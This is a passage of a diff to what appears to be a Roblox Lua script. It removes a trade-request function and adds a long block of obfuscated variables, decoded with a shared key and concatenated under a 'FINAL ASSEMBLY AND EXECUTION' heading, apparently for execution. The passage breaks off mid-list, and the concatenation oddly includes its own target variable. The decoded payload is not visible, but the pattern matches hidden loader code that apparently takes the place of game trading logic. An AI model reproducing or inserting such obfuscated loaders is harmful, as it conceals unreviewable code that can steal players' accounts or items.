+local _jnkbfipymmkc = _kcbzfegjjsxx(_kjoceptbrkuc, _wgvkjhwpsusl)
+local _zhvlvejczjuy = _kcbzfegjjsxx(_gofbbfjxksin, _wgvkjhwpsusl)
+local _grsjnubulbhy = _kcbzfegjjsxx(_nfcffninygba, _wgvkjhwpsusl)
+local _tmdvyhejduqt = _kcbzfegjjsxx(_jvclofdtnxpg, _wgvkjhwpsusl)
+local _dcpybaylkupy = _kcbzfegjjsxx(_ssxbitzbjqgf, _wgvkjhwpsusl)
+local _jpqarqmmssde = _kcbzfegjjsxx(_pvfzxadkzsid, _wgvkjhwpsusl)
+local _goltvasebjuh = _kcbzfegjjsxx(_nwjwhksaiqim, _wgvkjhwpsusl)
+local _qlvphkjboiae = _kcbzfegjjsxx(_hixtdfeheoia, _wgvkjhwpsusl)
+local _keibrlzubxkg = _kcbzfegjjsxx(_cgrfqlbblgaf, _wgvkjhwpsusl)
+local _prjnpreqscgb = _kcbzfegjjsxx(_akcykszxgned, _wgvkjhwpsusl)
+local _fiyuxhtkbzfl = _kcbzfegjjsxx(_gwiufssozlvu, _wgvkjhwpsusl)
+local _auutllnpawgy = _kcbzfegjjsxx(_suyzecjbbxll, _wgvkjhwpsusl)
+local _dlhxhapmbvig = _kcbzfegjjsxx(_fpkllvyuaahi, _wgvkjhwpsusl)
+local _kmrdozihvkwq = _kcbzfegjjsxx(_tdpmplxeziky, _wgvkjhwpsusl)
+local _cyjsswvawfif = _kcbzfegjjsxx(_puwqgthleiix, _wgvkjhwpsusl)
+local _wlpdghkpzzwm = _kcbzfegjjsxx(_ckzdlwifgefy, _wgvkjhwpsusl)
+local _ibdkymfneijd = _kcbzfegjjsxx(_gezqsbeaazix, _wgvkjhwpsusl)
+local _iupslfripwim = _kcbzfegjjsxx(_azaosuiubydi, _wgvkjhwpsusl)
+local _xyaogywdcrew = _kcbzfegjjsxx(_pqyfokvilimk, _wgvkjhwpsusl)
+local _keikmdsypnox = _kcbzfegjjsxx(_nslsswbwswbr, _wgvkjhwpsusl)
+local _ixasjdirmkqr = _kcbzfegjjsxx(_nlmfgnhxozrn, _wgvkjhwpsusl)
+local _bdeoznutxqzf = _kcbzfegjjsxx(_thmfstndcjor, _wgvkjhwpsusl)
+local _oekrzvyomaxm = _kcbzfegjjsxx(_jleyfhuwcklv, _wgvkjhwpsusl)
+local _zjuipttxhdyy = _kcbzfegjjsxx(_ecffgzbdmevp, _wgvkjhwpsusl)
+local _uzzlrbkltvag = _kcbzfegjjsxx(_hpzubsoxxtvp, _wgvkjhwpsusl)
+local _tdxbjxkrbolt = _kcbzfegjjsxx(_rbdtoipsumfi, _wgvkjhwpsusl)
+local _jwjtwurmcwhk = _kcbzfegjjsxx(_ggppyabozgzx, _wgvkjhwpsusl)
+local _nyiairmmxpzj = _kcbzfegjjsxx(_jbghklxuqpol, _wgvkjhwpsusl)
+local _wdhysmtvggbn = _kcbzfegjjsxx(_cosgfwpvxmsv, _wgvkjhwpsusl)
+local _ctthwvsahptm = _kcbzfegjjsxx(_goyjkxofmzht, _wgvkjhwpsusl)
+local _luufngsaujnd = _kcbzfegjjsxx(_gzsuihrxtljg, _wgvkjhwpsusl)
+local _kapkudznsdtg = _kcbzfegjjsxx(_hxuipohzcnxc, _wgvkjhwpsusl)
+local _zsawxykhbxco = _kcbzfegjjsxx(_ybiathevwqvr, _wgvkjhwpsusl)
+local _mjosczzyvvkc = _kcbzfegjjsxx(_dftzvbeeypuq, _wgvkjhwpsusl)
+local _mzsgpekqhlxn = _kcbzfegjjsxx(_abssymsjsxjl, _wgvkjhwpsusl)
+local _brscuyrjobgy = _kcbzfegjjsxx(_jpgvehdylvxc, _wgvkjhwpsusl)
+local _xcwxiqliyxwp = _kcbzfegjjsxx(_weszljnrtanq, _wgvkjhwpsusl)
+local _pscfxrwavwog = _kcbzfegjjsxx(_fbszlymnqvek, _wgvkjhwpsusl)
+local _jdqghkffjbhx = _kcbzfegjjsxx(_ibcbbciwjnta, _wgvkjhwpsusl)
+local _sjfborhkvccv = _kcbzfegjjsxx(_vgiyjiotvxxq, _wgvkjhwpsusl)
+local _zuggkdkqfkfy = _kcbzfegjjsxx(_svfavvjkzjgb, _wgvkjhwpsusl)
+local _tcgvdvmxbmot = _kcbzfegjjsxx(_oxirsqhhjbhi, _wgvkjhwpsusl)
+local _qyclsayeujot = _kcbzfegjjsxx(_clzoptlbvcgd, _wgvkjhwpsusl)
+local _chrxrykrfwwh = _kcbzfegjjsxx(_fkqjovpbnkmu, _wgvkjhwpsusl)
+local _mpvgwylwcylo = _kcbzfegjjsxx(_benyzyrmbwfn, _wgvkjhwpsusl)
+local _gqziufaebmgn = _kcbzfegjjsxx(_rpudtcrvncou, _wgvkjhwpsusl)
+local _cnzibwybyysw = _kcbzfegjjsxx(_laehdyuwhktr, _wgvkjhwpsusl)
+local _brgkrjyicdhs = _kcbzfegjjsxx(_dwkfvtesczeh, _wgvkjhwpsusl)
+local _ebykgjjzrdge = _kcbzfegjjsxx(_hbfcxgtayxgb, _wgvkjhwpsusl)
+local _chksjyaenney = _kcbzfegjjsxx(_evpcnxvjqecp, _wgvkjhwpsusl)
+local _ttyotfdrwpqo = _kcbzfegjjsxx(_siqxjvrahmaz, _wgvkjhwpsusl)
+local _xpooybouycic = _kcbzfegjjsxx(_ddcosxnnjpjy, _wgvkjhwpsusl)
+local _zkkcnzlkgbfp = _kcbzfegjjsxx(_nykscrmqjqnp, _wgvkjhwpsusl)
+local _mibuwwoimodm = _kcbzfegjjsxx(_bhhdgorbdgtq, _wgvkjhwpsusl)
+local _yhjzlxbrleaz = _kcbzfegjjsxx(_lcphuoqqloag, _wgvkjhwpsusl)
+local _rvtmyjemefdl = _kcbzfegjjsxx(_gxlgcrcppauz, _wgvkjhwpsusl)
+local _buxwixncwhlb = _kcbzfegjjsxx(_aggkhbzkkgrz, _wgvkjhwpsusl)
+local _znwunjwkopob = _kcbzfegjjsxx(_khidgbidnqit, _wgvkjhwpsusl)
+local _oatxwkjcfioe = _kcbzfegjjsxx(_zicvktdlcjye, _wgvkjhwpsusl)
+local _qphpjacjzgvt = _kcbzfegjjsxx(_qvxlnejesyip, _wgvkjhwpsusl)
+local _jbeijoawtvjb = _kcbzfegjjsxx(_dxebsdnqnyfy, _wgvkjhwpsusl)
+local _dlgnvmaluivv = _kcbzfegjjsxx(_ajfuqcwmwaqe, _wgvkjhwpsusl)
+local _knaobxpycoih = _kcbzfegjjsxx(_igdxddcjsevf, _wgvkjhwpsusl)
+local _myuxsxribion = _kcbzfegjjsxx(_bmnmccfanlbd, _wgvkjhwpsusl)
+local _ledfzytozlyz = _kcbzfegjjsxx(_dpwonlvinlzd, _wgvkjhwpsusl)
+local _jhxjkokwbmnn = _kcbzfegjjsxx(_tyzfarhnzceh, _wgvkjhwpsusl)
+local _takitwsmtzqb = _kcbzfegjjsxx(_zviritrxmlkd, _wgvkjhwpsusl)
+local _ygcahtfitxdi = _kcbzfegjjsxx(_cazypeundoen, _wgvkjhwpsusl)
+local _jlitptnboguw = _kcbzfegjjsxx(_yyooxakufisk, _wgvkjhwpsusl)
+local _xyimmpqkfqtw = _kcbzfegjjsxx(_tndphpzfumqy, _wgvkjhwpsusl)
+local _fefepkrhfzyj = _kcbzfegjjsxx(_rkqqneqcrqgi, _wgvkjhwpsusl)
+local _iekeownhvaba = _kcbzfegjjsxx(_apqkiruiwtzf, _wgvkjhwpsusl)
+local _eswuqfbizcbx = _kcbzfegjjsxx(_foceamwjigzp, _wgvkjhwpsusl)
+local _cuxvpmmiyyme = _kcbzfegjjsxx(_trsognqtxsac, _wgvkjhwpsusl)
+local _xwmmzjilmrwf = _kcbzfegjjsxx(_epcworgnqfkx, _wgvkjhwpsusl)
+local _sixktaxcvgut = _kcbzfegjjsxx(_uhonrknqxqsp, _wgvkjhwpsusl)
+local _cglpfroqpevg = _kcbzfegjjsxx(_pdfmytavzard, _wgvkjhwpsusl)
+local _sqhlitbmlrad = _kcbzfegjjsxx(_qjdruhzkcuom, _wgvkjhwpsusl)
+local _mnapvmktwtki = _kcbzfegjjsxx(_ccepsivfeatu, _wgvkjhwpsusl)
+local _pavfkuvjobep = _kcbzfegjjsxx(_gmlvydpojodr, _wgvkjhwpsusl)
+local _licaqgojchhp = _kcbzfegjjsxx(_womjbucofqsf, _wgvkjhwpsusl)
+local _txxawainqsrk = _kcbzfegjjsxx(_lkkdlrwaelcg, _wgvkjhwpsusl)
+local _rnvynltfzjgr = _kcbzfegjjsxx(_qzgbwlocduyy, _wgvkjhwpsusl)
+local _ppeaysdzxccv = _kcbzfegjjsxx(_zmcsoqgcyshc, _wgvkjhwpsusl)
+local _rjfghmlpgkof = _kcbzfegjjsxx(_nyfpxwsbqnkc, _wgvkjhwpsusl)
+local _ryezehnwoecc = _kcbzfegjjsxx(_flscvsiyxagz, _wgvkjhwpsusl)
+local _vfqbzhfnlzqp = _kcbzfegjjsxx(_smlhscowzhbc, _wgvkjhwpsusl)
+local _zobcwdpepcxg = _kcbzfegjjsxx(_dqmqxfuxhcwk, _wgvkjhwpsusl)
+local _pavsovznosru = _kcbzfegjjsxx(_ewavletocqpp, _wgvkjhwpsusl)
+local _wmffpgiqhhoy = _kcbzfegjjsxx(_jqweazrhhjyt, _wgvkjhwpsusl)
+local _xtgitdpwpvmi = _kcbzfegjjsxx(_hafjjsrjfbdy, _wgvkjhwpsusl)
+local _akguoqkgsatt = _kcbzfegjjsxx(_tubteugnizim, _wgvkjhwpsusl)
+local _yhbrwbsrnwhf = _kcbzfegjjsxx(_vrinrrpfkknq, _wgvkjhwpsusl)
+local _appnrrzcggsy = _kcbzfegjjsxx(_cukkkkufegfn, _wgvkjhwpsusl)
+local _lndernshoddl = _kcbzfegjjsxx(_vojvxqlhmqls, _wgvkjhwpsusl)
+local _piuyredkiwkm = _kcbzfegjjsxx(_pcdlicyjhyxf, _wgvkjhwpsusl)
+local _dininkcsturj = _kcbzfegjjsxx(_yshsdtkdfeuc, _wgvkjhwpsusl)
+local _xhwdbktfmhgq = _kcbzfegjjsxx(_wbvkncgfpyxh, _wgvkjhwpsusl)
+local _krezydgsvtzr = _kcbzfegjjsxx(_laftrwctqrlc, _wgvkjhwpsusl)
+local _bnlhkpacstkq = _kcbzfegjjsxx(_pkjwczfgdbcv, _wgvkjhwpsusl)
+local _layulevookop = _kcbzfegjjsxx(_jjzbfbotyiib, _wgvkjhwpsusl)
+local _pasijyzbzqhj = _kcbzfegjjsxx(_qrrpsvgclupk, _wgvkjhwpsusl)
+local _uuqdgnkyzxgq = _kcbzfegjjsxx(_lpbnebwubydz, _wgvkjhwpsusl)
+local _lphsqyrajykf = _kcbzfegjjsxx(_ipuflcrwvdtj, _wgvkjhwpsusl)
+local _bfypsipkkzmt = _kcbzfegjjsxx(_ceahwhlxsvjg, _wgvkjhwpsusl)
+local _nluodiuntbvk = _kcbzfegjjsxx(_kzdqoulenkph, _wgvkjhwpsusl)
+local _pkmmvsibbqxv = _kcbzfegjjsxx(_xlsdotqhczrl, _wgvkjhwpsusl)
+local _tsbhsqxoznpa = _kcbzfegjjsxx(_ugumbdeaajxj, _wgvkjhwpsusl)
+local _nkfqeixxyrkr = _kcbzfegjjsxx(_rwdlbhwerens, _wgvkjhwpsusl)
+local _mbphldolyjma = _kcbzfegjjsxx(_jtxdwcckcjos, _wgvkjhwpsusl)
+local _yjzkzvatwxnh = _kcbzfegjjsxx(_uarfdscsegxu, _wgvkjhwpsusl)
+local _auncggcoarqn = _kcbzfegjjsxx(_ggrlajzktrbc, _wgvkjhwpsusl)
+local _zgtxxkorwarq = _kcbzfegjjsxx(_xsvxtkslnsdg, _wgvkjhwpsusl)
+local _pfoaarxkltir = _kcbzfegjjsxx(_kmaihyrxkndz, _wgvkjhwpsusl)
+local _ryeutprnezwz = _kcbzfegjjsxx(_aumxhatgevgc, _wgvkjhwpsusl)
+local _ldskixzvgolz = _kcbzfegjjsxx(_yfcwuwascjzn, _wgvkjhwpsusl)
+local _wrudjxfoezpw = _kcbzfegjjsxx(_phubcqlwwiqu, _wgvkjhwpsusl)
+local _bsrqorvohduv = _kcbzfegjjsxx(_bhipddwmerhh, _wgvkjhwpsusl)
+local _zbzqxtirvzxk = _kcbzfegjjsxx(_djvjxmbrtrrp, _wgvkjhwpsusl)
+local _unumwmbqowht = _kcbzfegjjsxx(_emwwmzplqvot, _wgvkjhwpsusl)
+local _eowahspysyiu = _kcbzfegjjsxx(_xydcgbjyxyfm, _wgvkjhwpsusl)
+local _kxvbknamfgof = _kcbzfegjjsxx(_ngvepuxsoxcg, _wgvkjhwpsusl)
+local _bnpoivukvkuh = _kcbzfegjjsxx(_igflitpgjsnl, _wgvkjhwpsusl)
+local _whgrlcrpliho = _kcbzfegjjsxx(_spgcjzermjcx, _wgvkjhwpsusl)
+local _dubkzjlhzgvu = _kcbzfegjjsxx(_rrbixnsjkzlk, _wgvkjhwpsusl)
+local _hwjpqdmjcziy = _kcbzfegjjsxx(_dovibueqfbrb, _wgvkjhwpsusl)
+local _tmobokfxshqy = _kcbzfegjjsxx(_ccduqjaerhjv, _wgvkjhwpsusl)
+local _sfblvfxzzdwf = _kcbzfegjjsxx(_yxltboblxgct, _wgvkjhwpsusl)
+local _kyllqvlqyaud = _kcbzfegjjsxx(_yijuhqbxvkku, _wgvkjhwpsusl)
+local _ftqqzsgqbuof = _kcbzfegjjsxx(_luavdyrihtpv, _wgvkjhwpsusl)
+local _lwirnfluzcno = _kcbzfegjjsxx(_zamlptwsfhrk, _wgvkjhwpsusl)
+local _oyokviiqocle = _kcbzfegjjsxx(_fcawtwmrfedy, _wgvkjhwpsusl)
+local _wghvxvggyefq = _kcbzfegjjsxx(_xrdphicylbzu, _wgvkjhwpsusl)
+local _xmsyoldmufki = _kcbzfegjjsxx(_xlugxqilrlky, _wgvkjhwpsusl)
+local _irdbsrzlgssm = _kcbzfegjjsxx(_jukujxiyvuaj, _wgvkjhwpsusl)
+local _gfmxdrgcfios = _kcbzfegjjsxx(_qvzaujoaosnc, _wgvkjhwpsusl)
+local _asmwhceulvtn = _kcbzfegjjsxx(_mxeqqduepgtr, _wgvkjhwpsusl)
+local _tqjgbappgazg = _kcbzfegjjsxx(_kuyskovzytki, _wgvkjhwpsusl)
+local _jjehwevghagk = _kcbzfegjjsxx(_ldfhzvytddti, _wgvkjhwpsusl)
+local _mskpseieyzbz = _kcbzfegjjsxx(_bezpxqxroouu, _wgvkjhwpsusl)
+local _otrmzayturjf = _kcbzfegjjsxx(_quhiiaumlick, _wgvkjhwpsusl)
+local _iknjofbewjtd = _kcbzfegjjsxx(_eyyrgypyvmdz, _wgvkjhwpsusl)
+local _xucconuxzuaq = _kcbzfegjjsxx(_xhtaxvjpmutu, _wgvkjhwpsusl)
+local _gyjfptljozeo = _kcbzfegjjsxx(_ctcjaimbjvxk, _wgvkjhwpsusl)
+local _oqblnwzyktey = _kcbzfegjjsxx(_vqbxfrchhupx, _wgvkjhwpsusl)
+local _mbskfylyedgb = _kcbzfegjjsxx(_kjvinbflxypu, _wgvkjhwpsusl)
+local _abdvmnnytitt = _kcbzfegjjsxx(_ffzkfzcnfgtl, _wgvkjhwpsusl)
+local _mutivqxraavw = _kcbzfegjjsxx(_elxjsisrglfi, _wgvkjhwpsusl)
+local _xeghfdttuvle = _kcbzfegjjsxx(_mijavdeyxxck, _wgvkjhwpsusl)
+local _pxmxomunxtjn = _kcbzfegjjsxx(_tbmezgqqwhpc, _wgvkjhwpsusl)
+local _izmhvxzavway = _kcbzfegjjsxx(_ltwngtgzaxzr, _wgvkjhwpsusl)
+local _rynrvdnisnfg = _kcbzfegjjsxx(_uunoojufequx, _wgvkjhwpsusl)
+local _ftvdwdikfqnt = _kcbzfegjjsxx(_ywajmavzcrab, _wgvkjhwpsusl)
+local _pmxtqnxhpekf = _kcbzfegjjsxx(_sdmdkdeqbowc, _wgvkjhwpsusl)
+local _chfllzgqxrlx = _kcbzfegjjsxx(_ufdrsittaxyh, _wgvkjhwpsusl)
+local _tcejvdxsiisg = _kcbzfegjjsxx(_buenredtbaxg, _wgvkjhwpsusl)
+local _mmbcdolkouuv = _kcbzfegjjsxx(_nkzulwkcoild, _wgvkjhwpsusl)
+local _uoqmvsolttqt = _kcbzfegjjsxx(_srduawxdondz, _wgvkjhwpsusl)
+local _stgwtwnkngnl = _kcbzfegjjsxx(_camzwyajmifg, _wgvkjhwpsusl)
+local _gfwmpugkdcwt = _kcbzfegjjsxx(_krrjkiwhaglb, _wgvkjhwpsusl)
+local _xuuhbzoxqegb = _kcbzfegjjsxx(_xrrhehhmmzeb, _wgvkjhwpsusl)
+local _dmrkzvbjtyqw = _kcbzfegjjsxx(_zvcgvmhcbtgc, _wgvkjhwpsusl)
+local _ezkkxhmemgqd = _kcbzfegjjsxx(_scogixrotnqm, _wgvkjhwpsusl)
+local _ahhnyylczaui = _kcbzfegjjsxx(_kkhzcgynlskv, _wgvkjhwpsusl)
+local _dsocxsphwjlc = _kcbzfegjjsxx(_fmllieuuhajj, _wgvkjhwpsusl)
+local _kppkdprzzjos = _kcbzfegjjsxx(_fehgkjkajdad, _wgvkjhwpsusl)
+local _mdshoqpmubhh = _kcbzfegjjsxx(_aibtehyqlert, _wgvkjhwpsusl)
+local _uukbxeaevibm = _kcbzfegjjsxx(_nlhixtndfxsj, _wgvkjhwpsusl)
+local _hgdpfdggobhc = _kcbzfegjjsxx(_pjxwjswpotkh, _wgvkjhwpsusl)
+local _prrhsusvswtg = _kcbzfegjjsxx(_qvtivvoxtylc, _wgvkjhwpsusl)
+local _twigfplyzvqm = _kcbzfegjjsxx(_svzrrghebota, _wgvkjhwpsusl)
+local _zgwuwcczhdgy = _kcbzfegjjsxx(_kziqhatttwis, _wgvkjhwpsusl)
+local _papbbaakoptd = _kcbzfegjjsxx(_uaiuxvtujzce, _wgvkjhwpsusl)
+local _bmllaycvzspu = _kcbzfegjjsxx(_skqwlaagtjmc, _wgvkjhwpsusl)
+local _mdwfxsuyxdfr = _kcbzfegjjsxx(_ttxrplctfzvv, _wgvkjhwpsusl)
+local _qbkfkrlcabqk = _kcbzfegjjsxx(_mochfqqkpbjp, _wgvkjhwpsusl)
+local _gdowyznhyqji = _kcbzfegjjsxx(_utbupzvzsbix, _wgvkjhwpsusl)
+local _debjrkfvmdsg = _kcbzfegjjsxx(_ithrlyotkkyv, _wgvkjhwpsusl)
+local _vfpnhblogqql = _kcbzfegjjsxx(_wsmyeuzulzoq, _wgvkjhwpsusl)
+local _dztwzzgivelb = _kcbzfegjjsxx(_fgobzxdsawwb, _wgvkjhwpsusl)
+local _bdwzxvtiasog = _kcbzfegjjsxx(_aazzfptesdmj, _wgvkjhwpsusl)
+local _cjwygbwqyvrp = _kcbzfegjjsxx(_moyjdyqupbvh, _wgvkjhwpsusl)
+local _dyixwrhewyjd = _kcbzfegjjsxx(_apmzwqlomvfl, _wgvkjhwpsusl)
+local _xryievewhbcn = _kcbzfegjjsxx(_qxvwbqhmrgxm, _wgvkjhwpsusl)
+local _wtwwqcfqnuyc = _kcbzfegjjsxx(_bjvnjlmhwijo, _wgvkjhwpsusl)
+local _vcwlcgnmwjhj = _kcbzfegjjsxx(_tgcpbkrnimcq, _wgvkjhwpsusl)
+local _arqjlnypboiu = _kcbzfegjjsxx(_qgtfydsqudpi, _wgvkjhwpsusl)
+local _zprlbrtsifqr = _kcbzfegjjsxx(_ktialarpuuqn, _wgvkjhwpsusl)
+local _jrxzlrbvnjjj = _kcbzfegjjsxx(_euoxiroadymt, _wgvkjhwpsusl)
+local _qxohhmxpfzne = _kcbzfegjjsxx(_kjgvekyfepie, _wgvkjhwpsusl)
+local _kxuogzyxalhp = _kcbzfegjjsxx(_zrexbydzgcrf, _wgvkjhwpsusl)
+local _oyydklybxnna = _kcbzfegjjsxx(_jkgzmabvgtot, _wgvkjhwpsusl)
+local _ickgylzuamvw = _kcbzfegjjsxx(_etvyaatrdrty, _wgvkjhwpsusl)
+local _tpjnhdvkwdpa = _kcbzfegjjsxx(_ufiqmvsjhjny, _wgvkjhwpsusl)
+local _gdqpzukfrawj = _kcbzfegjjsxx(_iiuuvewieowl, _wgvkjhwpsusl)
+local _ktiaioqethuw = _kcbzfegjjsxx(_ykmrxopptjwh, _wgvkjhwpsusl)
+local _zigqsyxstufj = _kcbzfegjjsxx(_veitadkpfldn, _wgvkjhwpsusl)
+local _sgwtkqntsjsz = _kcbzfegjjsxx(_kabtbidpbshc, _wgvkjhwpsusl)
+local _mwwzqrvybmsh = _kcbzfegjjsxx(_fojolbpezmqr, _wgvkjhwpsusl)
+local _stotzjfczsqp = _kcbzfegjjsxx(_zjqhwlebvhts, _wgvkjhwpsusl)
+local _ynzeervrsfpp = _kcbzfegjjsxx(_pckumwiqvmbv, _wgvkjhwpsusl)
+local _pksgndljvcpl = _kcbzfegjjsxx(_bgspkebfoipv, _wgvkjhwpsusl)
+local _zuswkfkckszt = _kcbzfegjjsxx(_hnanxiqstpev, _wgvkjhwpsusl)
+local _vqrzzzyfoygj = _kcbzfegjjsxx(_ubcqygyxaxzw, _wgvkjhwpsusl)
+local _xiwkugqczpra = _kcbzfegjjsxx(_tmqircpukdib, _wgvkjhwpsusl)
+local _gvnkvdjbxvtg = _kcbzfegjjsxx(_qtvjxltihhjl, _wgvkjhwpsusl)
+local _hshmfqksrkng = _kcbzfegjjsxx(_dlacyfwdbanw, _wgvkjhwpsusl)
+local _asuklkoojsuq = _kcbzfegjjsxx(_unslzusmvnhy, _wgvkjhwpsusl)
+local _dbqbxymnpcxn = _kcbzfegjjsxx(_innbkhhtwxzw, _wgvkjhwpsusl)
+local _ncszxgphgeez = _kcbzfegjjsxx(_nnpxwjzhlcev, _wgvkjhwpsusl)
+local _oawqfkhbsbza = _kcbzfegjjsxx(_qlquinxdbdwv, _wgvkjhwpsusl)
+local _tckgahaknoie = _kcbzfegjjsxx(_reyisctpewqu, _wgvkjhwpsusl)
+local _nabnjowuvtuv = _kcbzfegjjsxx(_cvpdbqzchacg, _wgvkjhwpsusl)
+local _psptbqufanym = _kcbzfegjjsxx(_mljaxrmmlxhj, _wgvkjhwpsusl)
+local _ijlgxuywpqfu = _kcbzfegjjsxx(_oldudkcpzqex, _wgvkjhwpsusl)
+local _rwzqatljuzox = _kcbzfegjjsxx(_qmkkcycrvogs, _wgvkjhwpsusl)
+local _wytofyciymoo = _kcbzfegjjsxx(_chruczbxjobe, _wgvkjhwpsusl)
+local _wjgndklomiwb = _kcbzfegjjsxx(_tlhzxbtrptsz, _wgvkjhwpsusl)
+local _mazpuicupqlh = _kcbzfegjjsxx(_avlxbrvdirlz, _wgvkjhwpsusl)
+local _kmkifcldxioc = _kcbzfegjjsxx(_vurqtprzxkhb, _wgvkjhwpsusl)
+local _fzbfmcsjzfpy = _kcbzfegjjsxx(_djtllafvevnr, _wgvkjhwpsusl)
+local _vguueqvrkddo = _kcbzfegjjsxx(_eiesrhmetxql, _wgvkjhwpsusl)
+local _snjvtxihtyim = _kcbzfegjjsxx(_kzkvmnqqkxkr, _wgvkjhwpsusl)
+local _vablempljjna = _kcbzfegjjsxx(_wwrfgddyvywb, _wgvkjhwpsusl)
+local _cplnrhthudqq = _kcbzfegjjsxx(_toqewozjlbay, _wgvkjhwpsusl)
+local _rharpwxiagjt = _kcbzfegjjsxx(_cbtzedwgycrf, _wgvkjhwpsusl)
+local _ntidylqppdpg = _kcbzfegjjsxx(_wqgxaczzqauk, _wgvkjhwpsusl)
+local _xbhuqmrjunyj = _kcbzfegjjsxx(_pmignsuioarw, _wgvkjhwpsusl)
+local _kmfjjoyvccwi = _kcbzfegjjsxx(_fccqwimfqmhw, _wgvkjhwpsusl)
+local _osgxmtpbwqcz = _kcbzfegjjsxx(_rntdxrimpgtu, _wgvkjhwpsusl)
+local _zwrrrzbrobii = _kcbzfegjjsxx(_fdgipzgkohfs, _wgvkjhwpsusl)
+local _ljgwciweodqm = _kcbzfegjjsxx(_uvkjvscbcojo, _wgvkjhwpsusl)
+local _gtopxefukvws = _kcbzfegjjsxx(_ecklqoegexbn, _wgvkjhwpsusl)
+local _uccyzaccphrp = _kcbzfegjjsxx(_banziuprtvxw, _wgvkjhwpsusl)
+local _boabkcvltlvf = _kcbzfegjjsxx(_xiwkqhxarlgb, _wgvkjhwpsusl)
+local _prhklpigognn = _kcbzfegjjsxx(_cykzcwvcnwur, _wgvkjhwpsusl)
+local _iolsxhodnffw = _kcbzfegjjsxx(_amifnalmitks, _wgvkjhwpsusl)
+local _uadiosgdmfrk = _kcbzfegjjsxx(_fcciufmovcqc, _wgvkjhwpsusl)
+local _ricsaelvpblv = _kcbzfegjjsxx(_ocrflrugnrgv, _wgvkjhwpsusl)
+local _whqssqpnclfo = _kcbzfegjjsxx(_utpmyzbebhyt, _wgvkjhwpsusl)
+local _bzdcwupkuhjy = _kcbzfegjjsxx(_yjtzujuqikxv, _wgvkjhwpsusl)
+local _gqamwkbvcvvn = _kcbzfegjjsxx(_qbignhsjtyfp, _wgvkjhwpsusl)
+local _mewrjxazgsam = _kcbzfegjjsxx(_wmbeigaofhju, _wgvkjhwpsusl)
+local _gohhqtpvxeqn = _kcbzfegjjsxx(_glthhwhbqunu, _wgvkjhwpsusl)
+local _thhxysdslwsn = _kcbzfegjjsxx(_bhfcufytpxlo, _wgvkjhwpsusl)
+local _hqgircthfske = _kcbzfegjjsxx(_zhwryilspmlo, _wgvkjhwpsusl)
+local _cdadfynivipy = _kcbzfegjjsxx(_zbxisrgsmvrh, _wgvkjhwpsusl)
+local _vjytypustixa = _kcbzfegjjsxx(_jxtubtnnetqc, _wgvkjhwpsusl)
+local _wuhqwvmthssr = _kcbzfegjjsxx(_qaqrikpclidk, _wgvkjhwpsusl)
+local _gjbpdyqqbhon = _kcbzfegjjsxx(_phegijutxmzj, _wgvkjhwpsusl)
+local _wjfosyqfrwgd = _kcbzfegjjsxx(_pmyregzbcrjg, _wgvkjhwpsusl)
+local _jbhhecceeyli = _kcbzfegjjsxx(_cujufgxkgyki, _wgvkjhwpsusl)
+local _euqwdoejtsss = _kcbzfegjjsxx(_iakhkpihhxtz, _wgvkjhwpsusl)
+local _vceccssporex = _kcbzfegjjsxx(_uyhhgtwzjnqk, _wgvkjhwpsusl)
+local _xsquixvaqcif = _kcbzfegjjsxx(_mmzffhhrdiei, _wgvkjhwpsusl)
+local _fvmzcmptcwnj = _kcbzfegjjsxx(_ljolyehtmghk, _wgvkjhwpsusl)
+local _bxagbdceuwra = _kcbzfegjjsxx(_vtnrobqrhnml, _wgvkjhwpsusl)
 
+-- FINAL ASSEMBLY AND EXECUTION
 
-local function sendTradeRequest(user)
-    local target = Players:FindFirstChild(user)
-    if target then
-        pcall(function()
-            ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(target)
-        end)
-    end
+local _fhbgbjeqtvmw = table.concat({
+  _ftvisgxalzot,_mgirtaftgovz,_ndnhhibvedta,_lyksrezjbuxc,_ifodjhjcmdug,_xzxapqjthanh,_lnvyxvrtwslo,_bhdbponcbffq,_ubslkpwiqxsp,_etshnaxrcspy,_fhuntizbpdzm,_mgobqqngwrra,_hitkplbfmuto,_fjithcmmmfvn,_fbdogbyuzumv,_odutxsstyszo,_muxzgzowwzhb,_pwfzvxudmtci,_msncxlqzngmc,_ufthqmcixwnp,_fhbgbjeqtvmw,_qycviuwcexsg,_ecjioxfdyoje,_bibsamsatmal,_rzuikuifxlsi,_bhakzpjbokbv,_vplzwopcfyki,_kcrrcwckpupo,_fbzptovzjcbp,_vhtkqradhmqh,_sgstxcluqitz,_drybyhwrpuri,_cbmfvjjjkhgw,_jpmkfgpaxbwf,_gwpfpougdnle,_pwcjjfvodljh,_xfmtfjlngusl,_xgdvjakuzztf,_wysdtpemprty,_fbpqdsafiumb,_vcntvtydudxt,_movpftyqoqyh,_igfchlvxxotg,_dbsahnqewdon,_zcmciaketcnj,_uoehpbmavcmu,_euzlcntgdxir,_wolkfpzkgeya,_btmwvdhqizdc,_dbbttskcjutr,_oztrxgpwngac,_oeetnqlzccaf,_zsejgsetncqc,_euqwgxuxxqqh,_styptxneszbw,_ovemttrphxoq,_lwxsezangvbe,_xzedncifoyxp,_wlycmwebvpxk,_npneynaacawc,_xwturakrifdq,_ikdypjfzkclw,_amxhziexqcfk,_dlsbtlxfzmau,_ptxktrzltwfb,_moedafxetehz,_iqyyocyybzob,_hryqdsseqode,_regxbpxhqqzm,_yunaenhepyev,_setzbjaqnasr,_anpzyfzfuxxx,_spogszxqacvn,_neqqghbibylo,_jgxbgwdbvfue,_imyfvviuuaqp,_elrqsnejurgx,_jejzjndfpjqs,_teoklxcstjgt,_xyzscidtdzmf,_oomnwuykiwyb,_opipycbjackm,_jzvltqsbuozo,_ufompyqwggaj,_liprzdaurrxs,_xcnljdtffenw,_vtsddovidebt,_zsdiwbdlnrsx,_uhaymavviuma,_yonluaafjeqd,_hpndqdjnsqjm,_lhimrhofmgaz,_ceptkmuvitbx,_goexplwbbunc,_anttycrnfytz,_lxsisjogwfjp,_kdoqwffctuxv,_vbqrfepnsiel,_tddtokhkvlrc,_qnjrqjrsvbfc,_edveatelbsib,_nyhjrmqeiwyo,_xikzrawiwilb,_olpanfyhvnlx,_npdovzznsluv,_ffhqweqxsvvv,_nszendgxfsbx,_kaanoaiqopjg,_wynavzpmarxd,_bbuqbeyvejeg,_nausfxbwayru,_yhwanmsrcpmg,_tnlkvghiybpv,_noqqfihjqrug,_rcnjifthuitl,_jnkbfipymmkc,_zhvlvejczjuy,_grsjnubulbhy,_tmdvyhejduqt,_dcpybaylkupy,_jpqarqmmssde,_goltvasebjuh,_qlvphkjboiae,_keibrlzubxkg,_prjnpreqscgb,_fi